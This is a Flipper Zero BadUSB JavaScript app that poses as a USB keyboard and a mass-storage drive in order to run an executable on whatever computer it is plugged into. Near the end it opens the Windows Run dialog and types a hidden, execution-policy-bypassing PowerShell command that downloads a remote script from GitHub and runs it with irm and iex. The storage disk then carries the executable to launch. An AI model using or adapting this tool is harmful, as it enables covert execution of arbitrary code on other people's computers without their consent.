let layout = "en-US";
let scriptName = "script.exe";
//let scriptName = undefined;
// undefined = script.exe (default)
let usbdisk = require("usbdisk");
let storage = require("storage");
let badusb = require("badusb");
let notify = require("notification");
let submenu = require("submenu");
let dialog = require("dialog");
let sizes = [64, 128, 256, 512];
submenu.setHeader("What size for img?");
for (let i = 0; i < sizes.length; i++) {
  submenu.addItem(to_string(sizes[i]) + "MB", sizes[i]);
}
let imgSize = submenu.show();
if (typeof imgSize !== "number") {
  die("No image size selected");
}
let diskPath = "/ext/apps_data/mass_storage/" + to_string(imgSize) + "MB.img";
print("Img size: " + to_string(imgSize) + "mb");

if (!storage.exists(diskPath)) {
  print("Creating image...");
  usbdisk.createImage(diskPath, imgSize * 1024 * 1024);
  usbdisk.start(diskPath);
  notify.error();
  while (
    !dialog.message(
      "Add executable",
      "Press OK when executable is added. Follow instructions."
    )
  ) {
    delay(250);
  }
  notify.success();
  usbdisk.stop();
}

print("Starting badusb...");

badusb.setup({
  vid: 0xaaaa,
  pid: 0xbbbb,
  mfr_name: "Flipper",
  prod_name: "Zero",
  layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl",
});
// Wait until connected
print("Connect device to USB");
while (!badusb.isConnected()) {
  notify.blink("red", "short");
  delay(1000);
}

// After connected
print("USB is connected");
notify.success();
badusb.press("GUI", "r");
delay(500);
if (scriptName) {
  badusb.println(
    'powershell -w h -Ep Bypass $scriptName="' +
      scriptName +
      '";irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex'
  );
} else {
  badusb.println(
    "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex"
  );
}

badusb.quit();
delay(4000);
print("Running script");

usbdisk.start(diskPath);
notify.success();
while (!usbdisk.wasEjected()) {
  notify.blink("green", "short");
  delay(250);
}
notify.success();
print("Ejected, stopping UsbDisk...");
usbdisk.stop();
print("Done");
for (let i = 0; i < 5; i++) {
  notify.blink("green", "short");
  delay(50);
}
